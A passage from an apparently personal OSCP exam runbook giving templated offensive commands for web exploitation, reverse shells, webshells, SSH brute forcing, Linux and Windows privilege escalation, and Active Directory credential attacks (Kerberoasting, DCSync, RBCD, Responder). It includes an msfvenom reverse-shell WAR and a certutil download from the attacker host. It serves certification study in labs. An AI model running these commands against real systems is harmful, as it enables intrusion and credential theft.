whatweb "$WebURL" | tee "$BoxDir/loot/whatweb.txt"
curl -sS "$WebURL/$VersionPath" -o "$BoxDir/loot/version-file.txt"
searchsploit "$Product $Version"
~~~

### What did you get?

- [ ] Product, version, path, and access condition all match -> **Open [[#T21 - Buffer overflow and custom protocol exploit|T21]] or [[#T22 - Callback and shell stabilization|T22]] after reviewing and adapting the PoC.**
- [ ] Version matches but access condition does not -> **Do not run the exploit; return to [[#T06 - Web fingerprint and content discovery|T06]] or [[#T11 - Management interface and default credential branch|T11]] for authentication.**
- [ ] No exact match -> **Continue manual application review instead of forcing a CVE.**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - Exploit Search|Linux Exploit Search]] or the Windows equivalent, then use [[OSCP/RUNBOOK V2/Exploit Editing and Resource Guide|Exploit Editing]].

## T08 - CMS, WordPress, Monstra, Magento, or plugin branch

### Run this

~~~bash
wpscan --url "$WebURL" --enumerate u,vp,vt --format json -o "$BoxDir/loot/wpscan.json"
curl -sS "$WebURL/robots.txt" | tee "$BoxDir/loot/robots.txt"
curl -sS "$WebURL/wp-json/wp/v2/users" | tee "$BoxDir/loot/wp-users.json"
~~~

### What did you get?

- [ ] Version, REST route, or vulnerable plugin is confirmed -> **Open [[#T07 - Version-specific web exploit|T07]] and match the exact version and endpoint.**
- [ ] Default CMS credential works -> **Open [[#T11 - Management interface and default credential branch|T11]], validate it once, and inspect the authenticated upload or admin path.**
- [ ] Upload or plugin installation is available -> **Open [[#T17 - File upload and webshell|T17]].**
- [ ] No useful CMS path -> **Return to [[#T06 - Web fingerprint and content discovery|T06]] and inspect source, backups, and alternate applications.**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - CMS Check|CMS Check]]. Keep the raw version response in loot.

## T09 - Tomcat manager and WAR upload

### Run this

~~~bash
curl -sk -i "http://$BoxIP:$WebPort/manager/html" | tee "$BoxDir/loot/tomcat-manager.txt"
msfvenom -p java/jsp_shell_reverse_tcp LHOST="$LocalIP" LPORT="$Lport" -f war -o "$BoxDir/exploits/payload.war"
~~~

### What did you get?

- [ ] Manager accepts the validated credential -> **Upload the reviewed WAR, catch the callback, and open [[#T22 - Callback and shell stabilization|T22]].**
- [ ] Manager is present but rejects credentials -> **Return to [[#T18 - Source, configuration, backup, and log credential recovery|T18]] or [[#T23 - SSH credentials, keys, passphrases, and password reuse|T23]] for credential recovery.**
- [ ] Shell identity is already SYSTEM or Administrator -> **Open [[OSCP/EXAM RUNBOOK/08 - Evidence and Clean Down|Evidence and Clean Down]].**

### Open next

Use [[OSCP/RUNBOOK V2/Windows - Web - Tomcat|Windows Tomcat]] and clean the WAR after proof.

## T10 - Mail service default credentials and mailbox pivot

### Run this

~~~bash
nc "$BoxIP" "$AdminPort"
nc "$BoxIP" "$Pop3Port"
~~~

### What did you get?

- [ ] Mail administration accepts the validated or documented credential -> **Read the user database or reset only the target mailbox credential.**
- [ ] POP3 exposes a message or credential -> **Save it privately and open [[#T23 - SSH credentials, keys, passphrases, and password reuse|T23]].**
- [ ] The service is vulnerable by exact version -> **Open [[#T43 - SMTP, OpenSMTPD, and service-specific RCE|T43]] or [[#T07 - Version-specific web exploit|T07]] after reviewing the PoC.**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - Service Scan|Linux Service Scan]] or the matching service page, then validate the recovered SSH credential once.

## T11 - Management interface and default credential branch

### Run this

~~~bash
netexec smb "$BoxIP" -u "$Username" -p "$Password" -d "$Domain"
curl -sk -u "$Username:$Password" "https://$BoxIP:$WebPort/" -o "$BoxDir/loot/management-response.txt"
~~~

### What did you get?

- [ ] Management login succeeds -> **Use the panel terminal, file browser, or controlled action to obtain a shell or credential.**
- [ ] Default credential fails -> **Do not spray; open [[#T18 - Source, configuration, backup, and log credential recovery|T18]] or [[#T23 - SSH credentials, keys, passphrases, and password reuse|T23]].**
- [ ] Panel exposes an upload or command action -> **Open [[#T13 - Command injection|T13]] or [[#T17 - File upload and webshell|T17]].**

### Open next

Return to [[#T22 - Callback and shell stabilization|T22]] after a shell, [[#T18 - Source, configuration, backup, and log credential recovery|T18]] after a file disclosure, or [[#T31 - Windows services, tasks, AppLocker, and installer policy|T31]] when the panel controls a service or task.

## T12 - SQL injection and database extraction

### Run this

~~~bash
curl -sS --get "$WebURL/$Path" --data-urlencode "$Parameter=$TrueCondition" -o "$BoxDir/loot/sql-true.txt"
curl -sS --get "$WebURL/$Path" --data-urlencode "$Parameter=$FalseCondition" -o "$BoxDir/loot/sql-false.txt"
diff -u "$BoxDir/loot/sql-false.txt" "$BoxDir/loot/sql-true.txt"
~~~

### What did you get?

- [ ] True and false responses differ -> **Confirm the injection manually, then extract only the fields needed for credentials or command execution.**
- [ ] Database credentials or writable web root are found -> **Open [[#T18 - Source, configuration, backup, and log credential recovery|T18]] or [[#T13 - Command injection|T13]].**
- [ ] Responses do not differ -> **Check encoding, method, parameter name, and baseline before abandoning the branch.**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - SQLi|Linux SQLi]] and [[OSCP/MODULES/10. SQL Injection Attacks|SQL Injection module]]. Do not use sqlmap in this runbook.

## T13 - Command injection

### Run this

~~~bash
curl -sS -X POST "$WebURL/$Path" --data-urlencode "$Parameter=$HarmlessCommand" | tee "$BoxDir/loot/command-test.txt"
~~~

### What did you get?

- [ ] Harmless output is reflected or timing changes -> **Open [[#T22 - Callback and shell stabilization|T22]] for the callback path and preserve the request.**
- [ ] Command output is blind -> **Use a controlled marker or out-of-band check, then validate identity before a shell.**
- [ ] Input is filtered -> **Return to [[#T12 - SQL injection and database extraction|T12]], [[#T14 - LFI, RFI, and path traversal|T14]], or source review [[#T18 - Source, configuration, backup, and log credential recovery|T18]].**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - Command Injection|Linux Command Injection]] or the Windows command-injection stage, then stabilize the callback with [[#T22 - Callback and shell stabilization|T22]].

## T14 - LFI, RFI, and path traversal

### Run this

~~~bash
curl --path-as-is -sS "$WebURL/$Path?$Parameter=../../../../etc/passwd" | tee "$BoxDir/loot/file-read-test.txt"
~~~

### What did you get?

- [ ] A known safe file is returned -> **Read source or configuration next, then open [[#T18 - Source, configuration, backup, and log credential recovery|T18]].**
- [ ] Windows traversal returns a user or configuration file -> **Open [[#T18 - Source, configuration, backup, and log credential recovery|T18]] or [[#T23 - SSH credentials, keys, passphrases, and password reuse|T23]].**
- [ ] PHP source is returned -> **Inspect wrappers and include logic; open [[#T13 - Command injection|T13]] or [[#T17 - File upload and webshell|T17]].**
- [ ] File access is blocked -> **Check encoding and path normalization, then return to [[#T06 - Web fingerprint and content discovery|T06]].**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - LFI|Linux LFI]], [[OSCP/RUNBOOK V2/Linux - RFI|Linux RFI]], or the Windows traversal page that matches the service.

## T15 - XXE file read

### Run this

~~~bash
curl -sS -H 'Content-Type: text/xml' --data-binary "@$XXERequestFile" "$WebURL/$Path" | tee "$BoxDir/loot/xxe-response.txt"
~~~

### What did you get?

- [ ] A safe system file is reflected -> **Read only the source or credential file required for the next branch.**
- [ ] Source exposes unsafe deserialization or a command sink -> **Open [[#T13 - Command injection|T13]] or the corresponding application branch.**
- [ ] XML is parsed but no entity expands -> **Compare the root element, content type, and parser settings before changing payload style.**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - XXE|Linux XXE]] or [[OSCP/RUNBOOK V2/Windows - XXE|Windows XXE]], then open [[#T18 - Source, configuration, backup, and log credential recovery|T18]] or [[#T23 - SSH credentials, keys, passphrases, and password reuse|T23]] for recovered material.

## T16 - SSRF to an internal service

### Run this

~~~bash
curl -sS -X POST "$WebURL/$Path" --data-urlencode "$URLParameter=$InternalURL" | tee "$BoxDir/loot/ssrf-response.txt"
~~~

### What did you get?

- [ ] Internal HTTP response or credentials are disclosed -> **Save the response, identify the authenticated application, and open [[#T11 - Management interface and default credential branch|T11]] or [[#T12 - SQL injection and database extraction|T12]].**
- [ ] Port status or timing changes only -> **Map one internal port at a time and preserve the baseline.**
- [ ] Fetch is blocked -> **Review redirects, URL parsing, and hostname restrictions in Burp.**

### Open next

Use [[OSCP/MODULES/09. Common Web Application Attacks|Common Web Application Attacks module]] or the Windows web branch, then return to [[#T11 - Management interface and default credential branch|T11]], [[#T12 - SQL injection and database extraction|T12]], or [[#T17 - File upload and webshell|T17]].

## T17 - File upload and webshell

### Run this

~~~bash
curl -sS -F "$FileField=@$PayloadFile;filename=$UploadName" "$WebURL/$UploadPath" | tee "$BoxDir/loot/upload-response.txt"
curl -sS -X POST --data-urlencode "cmd=$HarmlessCommand" "$WebURL/$ShellPath" | tee "$BoxDir/loot/webshell-test.txt"
~~~

### What did you get?

- [ ] Upload succeeds and the file is reachable -> **Prove harmless command execution, then open [[#T22 - Callback and shell stabilization|T22]].**
- [ ] Filename or MIME control blocks the first file -> **Compare the exact multipart request and test the permitted extension path.**
- [ ] Upload lands in a web root or IIS directory -> **Set $ShellPath, then open [[#T20 - Interpreter, header backdoor, and exposed webshell|T20]] or [[#T22 - Callback and shell stabilization|T22]].**
- [ ] Share is writable but execution is not confirmed -> **Inspect the mapped path and return to [[#T06 - Web fingerprint and content discovery|T06]].**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - File Upload|Linux File Upload]] or [[OSCP/RUNBOOK V2/Windows - Web - FTP Upload|Windows FTP Upload]]. Preserve the original upload request for cleanup.

## T18 - Source, configuration, backup, and log credential recovery

### Run this

~~~bash
file "$BoxDir/loot/$File"
unzip -l "$BoxDir/loot/$Archive" 2>/dev/null || tar -tvf "$BoxDir/loot/$Archive"
grep -RniE 'password|passwd|secret|token|key|connection' "$BoxDir/loot/source" 2>/dev/null
~~~

### What did you get?

- [ ] Credential, key, cookie, or connection string is found -> **Store it privately and open [[#T23 - SSH credentials, keys, passphrases, and password reuse|T23]] or [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]] for one validation.**
- [ ] Source reveals an upload, include, command, or scheduler path -> **Open [[#T13 - Command injection|T13]], [[#T14 - LFI, RFI, and path traversal|T14]], [[#T17 - File upload and webshell|T17]], or [[#T27 - Linux cron, systemd, and scheduled-file abuse|T27]].**
- [ ] Archive is a compiled artifact -> **Open [[#T19 - JAR, PE, and custom binary analysis|T19]].**
- [ ] No useful material -> **Return to the service-specific branch instead of guessing at passwords.**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - Credential Search|Linux Credential Search]] or [[OSCP/RUNBOOK V2/Windows - Credential Search|Windows Credential Search]].

## T19 - JAR, PE, and custom binary analysis

### Run this

~~~bash
file "$BoxDir/loot/$File"
jar tf "$BoxDir/loot/$Jar" 2>/dev/null
javap -classpath "$BoxDir/loot/$Jar" -c "$ClassName" 2>/dev/null
strings -a "$BoxDir/loot/$File" | tee "$BoxDir/loot/strings.txt"
checksec --file="$BoxDir/loot/$File" 2>/dev/null
~~~

### What did you get?

- [ ] Hard-coded credential or connection string -> **Open [[#T23 - SSH credentials, keys, passphrases, and password reuse|T23]] or [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]].**
- [ ] Unsafe parser, command call, or memory bug -> **Open [[#T07 - Version-specific web exploit|T07]], [[#T13 - Command injection|T13]], or [[#T21 - Buffer overflow and custom protocol exploit|T21]].**
- [ ] README defines a protocol or terminator -> **Follow it exactly, then open [[#T21 - Buffer overflow and custom protocol exploit|T21]] if the service is vulnerable.**
- [ ] No useful clue -> **Return to [[#T06 - Web fingerprint and content discovery|T06]] or the custom-service branch.**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - Binary Analysis|Linux Binary Analysis]] and preserve the original artifact before modifying a copy.

## T20 - Interpreter, header backdoor, and exposed webshell

### Run this

~~~bash
curl -sSI "$WebURL/" | tee "$BoxDir/loot/headers.txt"
curl -sS -H "$BackdoorHeader" "$WebURL/" | tee "$BoxDir/loot/backdoor-test.txt"
curl -sS -X POST --data-urlencode "cmd=$HarmlessCommand" "$WebURL/$ShellPath" | tee "$BoxDir/loot/webshell-test.txt"
~~~

### What did you get?

- [ ] Identity output is returned -> **Open [[#T22 - Callback and shell stabilization|T22]] and use the confirmed command path for the callback.**
- [ ] Source comment or directory listing points to a shell -> **Download it, validate its authentication once, then open [[#T22 - Callback and shell stabilization|T22]].**
- [ ] Version header matches but the backdoor does not respond -> **Continue [[#T06 - Web fingerprint and content discovery|T06]] and do not force the payload.**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - RCE to Shell|Linux RCE to Shell]] or the Windows webshell stage. Preserve the header and response as evidence.

## T21 - Buffer overflow and custom protocol exploit

### Run this

~~~bash
file "$ExploitFile"
python3 "$ExploitFile" --host "$BoxIP" --port "$ServicePort"
~~~

### What did you get?

- [ ] Callback arrives -> **Open [[#T22 - Callback and shell stabilization|T22]] and confirm architecture and identity.**
- [ ] Service crashes or resets -> **Check offset, bad characters, terminator, architecture, and single-shot behavior before retrying once.**
- [ ] PoC targets another version or protocol -> **Open [[#T07 - Version-specific web exploit|T07]] and adapt only after reviewing the version and service.**

### Open next

Use [[OSCP/RUNBOOK V2/Exploit Editing and Resource Guide|Exploit Editing]] and the matching buffer-overflow breakdown. Keep the original binary and PoC in private loot.

## T22 - Callback and shell stabilization

### Run this

~~~bash
rlwrap nc -lvnp "$Lport"
~~~

~~~bash
id
whoami
hostname
~~~

### What did you get?

- [ ] Stable Linux shell -> **Open [[OSCP/EXAM RUNBOOK/03 - Linux Fast Path|Linux Fast Path]].**
- [ ] Stable Windows shell -> **Open [[OSCP/EXAM RUNBOOK/04 - Windows Fast Path|Windows Fast Path]].**
- [ ] Raw or restricted shell -> **Open [[OSCP/RUNBOOK V2/Linux - Shell Stabilise|Linux Shell Stabilise]] or [[#T24 - Restricted shell|T24]].**
- [ ] No callback -> **Check $LocalIP, listener interface, payload architecture, target egress, and the saved request.**

### Open next

Run identity commands before enumeration. Capture the foothold only after the shell identity is visible.

## T23 - SSH credentials, keys, passphrases, and password reuse

### Run this

~~~bash
john --wordlist="$Wordlist" "$HashFile"
ssh "$Username@$BoxIP"
# Only after a discovered username list and an in-scope short wordlist.
hydra -L "$UserFile" -P "$Wordlist" "ssh://$BoxIP" -t 4 -f
~~~

### What did you get?

- [ ] Credential or key validates over SSH -> **Open [[#T22 - Callback and shell stabilization|T22]] if interactive, then [[#T25 - Linux sudo interpreter and editor abuse|T25]] or [[#T26 - Linux SUID, capabilities, and privileged binary|T26]].**
- [ ] Credential works on another exposed service -> **Open [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]] and use the service with the least privilege boundary.**
- [ ] Key is encrypted or hash is not cracked -> **Open [[#T45 - Password cracking and mechanical decoding|T45]] and keep the original artifact unchanged.**
- [ ] A username list and a justified short SSH wordlist are available -> **Run one controlled test window, then validate the result with [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]].**
- [ ] Validation fails -> **Recheck username format, domain, key permissions, and source of the credential.**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - Credential Search|Linux Credential Search]] or the AD credential validation stage. Do not turn a controlled wordlist check into unrestricted spraying.

## T24 - Restricted shell

### Run this

~~~bash
echo "$SHELL"
help 2>/dev/null
command -v ssh scp python3 perl vim
~~~

### What did you get?

- [ ] An allowed interpreter, editor, or file-transfer command exists -> **Use the matching shell escape route and confirm id.**
- [ ] SSH command restrictions are present -> **Use the allowed subsystem or command form, then open [[#T22 - Callback and shell stabilization|T22]].**
- [ ] No escape is available -> **Inspect local files, cron, and service configuration from the restricted context.**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - Shell Stabilise|Linux Shell Stabilise]] and return to [[#T25 - Linux sudo interpreter and editor abuse|T25]] or [[#T27 - Linux cron, systemd, and scheduled-file abuse|T27]] once the shell is usable.

## T25 - Linux sudo interpreter and editor abuse

### Run this

~~~bash
sudo -l
~~~

### What did you get?

- [ ] NOPASSWD permits an interpreter or unrestricted command -> **Run the exact permitted path, then confirm id.**
- [ ] sudo permits an editor, pager, or system utility -> **Open the matching sudo page and use its documented shell escape.**
- [ ] No useful sudo rule -> **Open [[#T26 - Linux SUID, capabilities, and privileged binary|T26]], [[#T27 - Linux cron, systemd, and scheduled-file abuse|T27]], or [[#T18 - Source, configuration, backup, and log credential recovery|T18]].**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux Sudo Check]]. Do not substitute a different binary for the one shown by sudo -l.

## T26 - Linux SUID, capabilities, and privileged binary

### Run this

~~~bash
find / -perm -4000 -type f -ls 2>/dev/null | tee "$BoxDir/loot/suid.txt"
getcap -r / 2>/dev/null | tee "$BoxDir/loot/capabilities.txt"
file "$SUIDPath"
strings -a "$SUIDPath" | head -n 80
~~~

### What did you get?

- [ ] Known SUID or capability primitive -> **Open the exact binary page and reproduce the identity change.**
- [ ] Custom binary with unsafe input -> **Open [[#T19 - JAR, PE, and custom binary analysis|T19]] or [[#T21 - Buffer overflow and custom protocol exploit|T21]].**
- [ ] No execution path -> **Open [[#T25 - Linux sudo interpreter and editor abuse|T25]], [[#T27 - Linux cron, systemd, and scheduled-file abuse|T27]], or [[#T18 - Source, configuration, backup, and log credential recovery|T18]].**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - SUID Check|Linux SUID Check]] and record owner, mode, capability, and execution result.

## T27 - Linux cron, systemd, and scheduled-file abuse

### Run this

~~~bash
cat /etc/crontab
systemctl list-timers --all 2>/dev/null
find /etc/cron* /var/spool/cron /opt /scripts -type f -writable -ls 2>/dev/null
stat "$ScriptPath" "$OutputPath" 2>/dev/null
~~~

### What did you get?

- [ ] Root-run writable script or timer -> **Back up the file, make one controlled change, wait for the trigger, verify identity, and restore it.**
- [ ] Filename or argument reaches an unquoted command -> **Open [[#T13 - Command injection|T13]] and validate the scheduler context.**
- [ ] No writable scheduler path -> **Return to [[#T25 - Linux sudo interpreter and editor abuse|T25]], [[#T26 - Linux SUID, capabilities, and privileged binary|T26]], or [[#T18 - Source, configuration, backup, and log credential recovery|T18]].**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - Cron Check|Linux Cron Check]] or [[OSCP/RUNBOOK V2/Windows - Scheduled Task Abuse|Windows Scheduled Task Abuse]] for the exact platform branch.

## T28 - Local services, port forwarding, and tmux or VNC

### Run this

~~~bash
ss -lntup 2>/dev/null || netstat -an
find / -type s -ls 2>/dev/null
ssh -N -L "$LocalPort:$LoopbackHost:$RemotePort" "$Username@$BoxIP"
~~~

### What did you get?

- [ ] Loopback web or management service -> **Open [[#T06 - Web fingerprint and content discovery|T06]] or [[#T11 - Management interface and default credential branch|T11]] through the tunnel.**
- [ ] Loopback VNC or RFB service -> **Open [[OSCP/RUNBOOK V2/Linux - Port Forwarding|Linux Port Forwarding]].**
- [ ] Readable root tmux socket -> **Open [[OSCP/RUNBOOK V2/Linux - Tmux Session Hijack|Tmux Session Hijack]], attach, and confirm identity.**
- [ ] Chisel or another pivot is required -> **Open the modern tunnelling page and save the tunnel command.**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - Port Forwarding|Linux Port Forwarding]] or [[OSCP/MODERN TOOLING/Chisel|Chisel]]. Stop the tunnel after proof.

## T29 - Linux kernel or legacy local exploit

### Run this

~~~bash
uname -a
cat /etc/os-release 2>/dev/null
searchsploit "$Kernel $Distribution"
~~~

### What did you get?

- [ ] Kernel, distribution, architecture, and prerequisites match -> **Review and adapt the exploit in a copy, then test once.**
- [ ] Any prerequisite does not match -> **Return to [[#T25 - Linux sudo interpreter and editor abuse|T25]], [[#T26 - Linux SUID, capabilities, and privileged binary|T26]], [[#T27 - Linux cron, systemd, and scheduled-file abuse|T27]], or [[#T28 - Local services, port forwarding, and tmux or VNC|T28]].**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - Kernel Exploit|Linux Kernel Exploit]]. Kernel work is the last local branch after direct permissions and credentials.

## T30 - Windows impersonation token abuse

### Run this

~~~cmd
whoami /priv
whoami /groups
~~~

~~~powershell
certutil -urlcache -split -f "http://$LocalIP:$TransferPort/$Tool" "$ToolPath"
~~~

### What did you get?

- [ ] SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is enabled -> **Use the compatible Potato or GodPotato route and confirm SYSTEM.**
- [ ] Privilege is present but the tool fails -> **Check architecture, COM class, listener, and service identity before changing exploit family.**
- [ ] Privilege is absent -> **Return to [[#T31 - Windows services, tasks, AppLocker, and installer policy|T31]], [[#T32 - Windows ACL and file-permission abuse|T32]], or [[#T33 - Windows credential artifacts, LSASS, Winlogon, and Credential Manager|T33]].**

### Open next

Use [[OSCP/RUNBOOK V2/Windows - SeImpersonate Abuse|Windows SeImpersonate Abuse]]. Remove the uploaded tool after proof.

## T31 - Windows services, tasks, AppLocker, and installer policy

### Run this

~~~powershell
Get-CimInstance Win32_Service | Select-Object Name,StartName,State,PathName
schtasks /query /fo LIST /v
icacls "$ServicePath"
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
Get-AppLockerPolicy -Effective -Xml 2>$null
~~~

### What did you get?

- [ ] Writable service binary, directory, or task action -> **Open the matching service or scheduled-task branch and confirm execution identity.**
- [ ] AlwaysInstallElevated is enabled in both required policy locations -> **Open the MSI branch and verify SYSTEM execution.**
- [ ] AppLocker blocks the obvious payload -> **Identify an allowed signed or script-host path, then validate it with a harmless command.**
- [ ] No local path -> **Open [[#T33 - Windows credential artifacts, LSASS, Winlogon, and Credential Manager|T33]] or [[#T05 - SNMP, IKE, and IPSec transport gate|T05]] for AD and credential routes.**

### Open next

Use [[OSCP/RUNBOOK V2/Windows - Service Abuse|Windows Service Abuse]], [[OSCP/RUNBOOK V2/Windows - Scheduled Task Abuse|Windows Scheduled Task Abuse]], or [[OSCP/RUNBOOK V2/Windows - Privilege Triage|Windows Privilege Triage]].

## T32 - Windows ACL and file-permission abuse

### Run this

~~~cmd
icacls "%TargetPath%"
whoami /groups
~~~

### What did you get?

- [ ] Current user can modify a privileged file or ACL -> **Back up the original, make the smallest controlled change, trigger it, and restore it.**
- [ ] Administrator desktop or proof file is writable -> **Apply only the required ACL change, verify the result, and clean it down.**
- [ ] ACL is read-only -> **Return to [[#T30 - Windows impersonation token abuse|T30]], [[#T31 - Windows services, tasks, AppLocker, and installer policy|T31]], or [[#T33 - Windows credential artifacts, LSASS, Winlogon, and Credential Manager|T33]].**

### Open next

Use [[OSCP/RUNBOOK V2/Windows - Privesc - ACL Misconfiguration|Windows ACL Misconfiguration]] and record the before and after ACL.

## T33 - Windows credential artifacts, LSASS, Winlogon, and Credential Manager

### Run this

~~~cmd
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
~~~

~~~powershell
Get-ChildItem C:\Users,C:\ProgramData -Recurse -File -ErrorAction SilentlyContinue | Select-String -Pattern 'password','passwd','secret','credential','token'
~~~

### What did you get?

- [ ] Cleartext or reusable credential -> **Store it privately and validate once with [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]].**
- [ ] LSASS or hive artifact -> **Copy only the required evidence, parse offline, and open [[#T39 - NTDS, VSS, Backup Operators, and DCSync|T39]] or [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]].**
- [ ] Credential Manager entry -> **Use the matching Windows credential tool and validate the recovered account.**
- [ ] No artifact -> **Return to [[#T30 - Windows impersonation token abuse|T30]], [[#T31 - Windows services, tasks, AppLocker, and installer policy|T31]], or AD enumeration.**

### Open next

Use [[OSCP/RUNBOOK V2/Windows - Credential Search|Windows Credential Search]] and the relevant DPAPI or hive extraction stage.

## T34 - Kerberos AS-REP roasting and Kerberoasting

### Run this

~~~bash
GetNPUsers.py "$Domain/" -dc-ip "$DCIP" -usersfile "$UserFile" -no-pass -format hashcat -outputfile "$BoxDir/loot/asrep.txt"
GetUserSPNs.py "$Domain/$Username:$Password" -dc-ip "$DCIP" -request -outputfile "$BoxDir/loot/kerberoast.txt"
john --wordlist="$Wordlist" "$BoxDir/loot/asrep.txt"
~~~

### What did you get?

- [ ] AS-REP response or service ticket is saved -> **Open [[#T45 - Password cracking and mechanical decoding|T45]], then validate the recovered account with [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]].**
- [ ] No roastable account -> **Open [[#T36 - AD ACL, group membership, and ForceChangePassword|T36]], [[#T37 - gMSA password read|T37]], or [[#T38 - RBCD and delegated group abuse|T38]] through BloodHound and LDAP.**
- [ ] Ticket request fails on time or name -> **Open [[OSCP/RUNBOOK V2/AD - Clock Sync|AD Clock Sync]] and verify $FQDN.**

### Open next

Use [[OSCP/RUNBOOK V2/AD - AS-REP Roasting|AD AS-REP Roasting]] and [[OSCP/RUNBOOK V2/AD - Kerberoasting|AD Kerberoasting]]. Crack offline only.

## T35 - Group Policy Preferences credential recovery

### Run this

~~~bash
smbclient -N "//$DCIP/Replication" -c 'recurse;prompt OFF;mget *'
grep -Rni 'cpassword' . | tee "$BoxDir/loot/gpp-hits.txt"
gpp-decrypt "$GPPValue"
~~~

### What did you get?

- [ ] GPP credential is recovered -> **Open [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]] and validate it against SMB or LDAP.**
- [ ] Share is readable but no cpassword appears -> **Inspect XML and SYSVOL paths, then return to [[#T02 - Anonymous SMB, LDAP, and RPC enumeration|T02]].**
- [ ] Anonymous share is denied -> **Use known credentials or return to [[#T34 - Kerberos AS-REP roasting and Kerberoasting|T34]].**

### Open next

Use [[OSCP/RUNBOOK V2/AD - Anonymous Enum|AD Anonymous Enumeration]] and keep the recovered value in private loot.

## T36 - AD ACL, group membership, and ForceChangePassword

### Run this

~~~bash
netexec ldap "$DCIP" -u "$Username" -p "$Password" -d "$Domain" --groups
dacledit.py -action read -target "$TargetObject" -u "$Username" -p "$Password" -d "$Domain" -dc-ip "$DCIP"
~~~

### What did you get?

- [ ] ForceChangePassword over a user -> **Reset only the named account, validate the new credential with [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]], then refresh the graph.**
- [ ] GenericWrite, GenericAll, or AddMember -> **Open [[#T37 - gMSA password read|T37]] or [[#T38 - RBCD and delegated group abuse|T38]] depending on the controlled object.**
- [ ] No write edge -> **Return to [[#T34 - Kerberos AS-REP roasting and Kerberoasting|T34]] or [[#T33 - Windows credential artifacts, LSASS, Winlogon, and Credential Manager|T33]] for credential discovery.**

### Open next

Use [[OSCP/RUNBOOK V2/AD - BloodHound|AD BloodHound]] and [[OSCP/RUNBOOK V2/AD - ForceChangePassword|AD ForceChangePassword]]. Record the exact object and edge before changing it.

## T37 - gMSA password read

### Run this

~~~bash
gMSADumper.py -u "$Username" -p "$Password" -d "$Domain" -l "$DCIP" | tee "$BoxDir/loot/gmsa.txt"
bloodyAD -d "$Domain" -u "$Username" -p "$Password" --host "$DCIP" get object "$GMSAAccount" --attr msDS-ManagedPassword --raw
~~~

### What did you get?

- [ ] Managed password is readable -> **Store it privately, validate the gMSA account with [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]], and open [[#T36 - AD ACL, group membership, and ForceChangePassword|T36]] or [[#T38 - RBCD and delegated group abuse|T38]].**
- [ ] ReadGMSAPassword edge exists but the read fails -> **Check account format, LDAP host, and Kerberos time.**
- [ ] No read edge -> **Return to [[#T36 - AD ACL, group membership, and ForceChangePassword|T36]] and inspect group control.**

### Open next

Use [[OSCP/RUNBOOK V2/AD - BloodHound|AD BloodHound]] and the [[OSCP/MODERN TOOLING/BloodyAD|BloodyAD]] reference.

## T38 - RBCD and delegated group abuse

### Run this

~~~bash
bloodyAD -d "$Domain" -u "$Username" -k ccache="$BoxDir/loot/$Username.ccache" kdc="$DCIP" -H "$FQDN" -i "$DCIP" add groupMember "$DelegatedGroup" "$MachineAccount"
getST.py -spn "cifs/$FQDN" -impersonate "$AdminUser" -dc-ip "$DCIP" "$Domain/$MachineAccount" -k -no-pass -out "$BoxDir/loot/$AdminUser.ccache"
~~~

### What did you get?

- [ ] Group membership or RBCD attribute update succeeds -> **Use the new ccache with the required Kerberos client and confirm identity.**
- [ ] KDC_ERR_BADOPTION -> **Refresh group membership, machine TGT, FQDN, and clock before retrying once.**
- [ ] No writable target computer or group -> **Return to [[#T36 - AD ACL, group membership, and ForceChangePassword|T36]] and select another edge.**

### Open next

Use [[OSCP/RUNBOOK V2/AD - Resource-Based Constrained Delegation|AD RBCD]] and remove the temporary member or RBCD entry during [[#T49 - Cleanup and closeout after a scenario branch|T49]] cleanup.

## T39 - NTDS, VSS, Backup Operators, and DCSync

### Run this

~~~bash
netexec smb "$DCIP" -u "$Username" -p "$Password" -d "$Domain" --ntds
secretsdump.py -system "$SystemHive" -ntds "$NtdsFile" LOCAL
~~~

### What did you get?

- [ ] Direct replication succeeds -> **Save the output privately and validate the required hash with [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]].**
- [ ] Backup Operators or SeBackupPrivilege is confirmed -> **Use the VSS or offline NTDS route, then parse locally.**
- [ ] NTDS and SYSTEM are available on a share -> **Copy them, parse offline, and avoid unnecessary target changes.**
- [ ] No replication or backup path -> **Return to [[#T33 - Windows credential artifacts, LSASS, Winlogon, and Credential Manager|T33]], [[#T36 - AD ACL, group membership, and ForceChangePassword|T36]], or [[#T38 - RBCD and delegated group abuse|T38]].**

### Open next

Use [[OSCP/RUNBOOK V2/AD - DCSync Dump|AD DCSync Dump]], [[OSCP/RUNBOOK V2/AD - Backup Operators|AD Backup Operators]], or the NTDS extraction stage that matches the evidence.

## T40 - NTLM capture and LDAP passback

### Run this

~~~bash
sudo responder -I "$Interface" -dwv
nc -lvnp 389
~~~

### What did you get?

- [ ] NTLM challenge-response is captured -> **Save it privately, open [[#T45 - Password cracking and mechanical decoding|T45]], then validate the cracked account with [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]].**
